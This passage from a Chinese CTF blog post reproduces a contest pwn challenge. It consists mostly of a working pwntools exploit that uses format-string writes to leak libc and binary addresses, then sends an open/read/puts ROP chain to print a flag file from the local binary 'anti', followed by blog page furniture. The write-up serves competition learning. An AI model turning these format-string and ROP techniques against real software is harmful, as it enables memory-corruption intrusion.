libc.search(asm('pop rdx\nret')).next()</span></span><br><span class="line"><span class="string">prax = libc.search(asm('pop rax\nret')).next()</span></span><br><span class="line"><span class="string">syscall = libc.search(asm('syscall\nret')).next()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gift: '</span>)</span><br><span class="line">    stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">'Stack:\t'</span> + hex(stack))</span><br><span class="line">    offset = <span class="number">9</span></span><br><span class="line">    check = stack&amp;<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">if</span> check &gt; <span class="number">0x2000</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack&amp;<span class="number">0xFF</span> - <span class="number">0x10</span>)) + <span class="string">'c%6$hhn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%61c%10$hhn'</span>)       <span class="comment">#func1</span></span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x10</span> - <span class="number">0x10</span> + <span class="number">1</span>)&amp;<span class="number">0xFFFF</span>) + <span class="string">'c%6$hn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%74c%10$hhn'</span>)       <span class="comment">#start xa</span></span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x10</span> - <span class="number">0x10</span> + <span class="number">0</span>)&amp;<span class="number">0xFFFF</span>) + <span class="string">'c%6$hn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%144c%10$hhn'</span>)      <span class="comment">#start 90</span></span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x10</span> - <span class="number">0x18</span>)&amp;<span class="number">0xFFFF</span>) + <span class="string">'c%6$hn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%183c%10$hhn'</span>)      <span class="comment">#ret</span></span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x70</span>)&amp;<span class="number">0xFFFF</span>) + <span class="string">'c%6$hn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%144c%10$hhn'</span>)      <span class="comment">#_IO_2_1_stdout+112</span></span><br><span class="line">    p.sendline(<span class="string">'%2c%29$naaa'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'aaa'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(<span class="string">'libc:%13$pelf:%9$p'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'libc:'</span>)</span><br><span class="line">    libc.address = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">'libcbase-&gt;%#x'</span>%libc.address)</span><br><span class="line">    p.recvuntil(<span class="string">'elf:'</span>)</span><br><span class="line">    elf.address = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x202040</span></span><br><span class="line">    log.success(<span class="string">'elfbase-&gt;%#x'</span>%elf.address)</span><br><span class="line"></span><br><span class="line">    prdi = libc.search(asm(<span class="string">'pop rdi\nret'</span>)).next()</span><br><span class="line">    prsi = libc.search(asm(<span class="string">'pop rsi\nret'</span>)).next()</span><br><span class="line">    prdx = libc.search(asm(<span class="string">'pop rdx\nret'</span>)).next()</span><br><span class="line">    </span><br><span class="line">    orw = <span class="string">'flag\x00\x00\x00\x00'</span></span><br><span class="line">    orw += p64(prdi)+p64(elf.address+<span class="number">0x202058</span>)+p64(prsi)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">'open'</span>])   <span class="comment">#0</span></span><br><span class="line">    orw += p64(prdi)+p64(<span class="number">1</span>)+p64(prsi)+p64(elf.address+<span class="number">0x202100</span>)+p64(prdx)+p64(<span class="number">0x40</span>)+p64(libc.sym[<span class="string">'read'</span>])</span><br><span class="line">    orw += p64(prdi)+p64(elf.address+<span class="number">0x202100</span>)+p64(libc.sym[<span class="string">'puts'</span>])</span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x128</span>)&amp;<span class="number">0xFFFF</span>) + <span class="string">'c%15$hn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%88c%41$hhn'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x128</span> + i)&amp;<span class="number">0xFF</span>) + <span class="string">'c%15$hhn'</span>)</span><br><span class="line">        p.sendline(<span class="string">'%'</span> + str(((elf.address + <span class="number">0x202040</span>)&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xFF</span>) + <span class="string">'c%41$hhn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%'</span> + str((stack - <span class="number">0x120</span>)&amp;<span class="number">0xFF</span>) + <span class="string">'c%15$hhn'</span>)</span><br><span class="line">    p.sendline(<span class="string">'%182c%41$hhn'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>) + orw)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">"anti"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span>(exp() == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Tinia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://tinia.top/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/">http://tinia.top/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Tinia.top">Tinia's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a></div><div class="post_share"><div class="social-share" data-image="/img/cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/11/07/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/"><img class="prev_cover lazyload" data-src="/img/cover.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>湖湘杯复现</span></div></a></div><div class="next-post pull_right"><a href="/2020/10/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"><img class="next_cover lazyload" data-src="/img/cover.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>深入理解操作系统读书笔记</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/04/14/2016-0CTF-zerostorage/" title="2016_0CTF_zerostorage"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-14</div><div class="relatedPosts_title">2016_0CTF_zerostorage</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/08/2016-HCTF-fheap/" title="2016-HCTF-fheap"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-08</div><div class="relatedPosts_title">2016-HCTF-fheap</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/07/2014_hitcon_stkof/" title="2014_hitcon_stkof"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-07</div><div class="relatedPosts_title">2014_hitcon_stkof</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/08/2016-zctf-note2/" title="2016_zctf_note2"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-04-08</div><div class="relatedPosts_title">2016_zctf_note2</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/11/2017-smallest/" title="360ichunqiu_2017-smallest"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-11</div><div class="relatedPosts_title">360ichunqiu_2017-smallest</div></div></a></div><div class="relatedPosts_item"><a href="/2020/01/29/MMA_CTF 2nd_2016-greeting/" title="MMA_CTF 2nd_2016-greeting"><img class="relatedPosts_cover lazyload"data-src="/img/cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-29</div><div class="relatedPosts_title">MMA_CTF 2nd_2016-greeting</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'http://tinia.top/2020/11/06/%E5%9B%BD%E8%B5%9Bday2pwn%E5%A4%8D%E7%8E%B0/';
  this.page.identifier = '2020/11/06/国赛day2pwn复现/';
  this.page.title = '国赛day2pwn复现';
}
var d = document, s = d.createElement('script');
s.src = "https://" + '' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By Tinia</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/activate-power-mode/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false; 
document.body.addEventListener('input', POWERMODE);
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/ClickShowText.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":232,"height":504},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>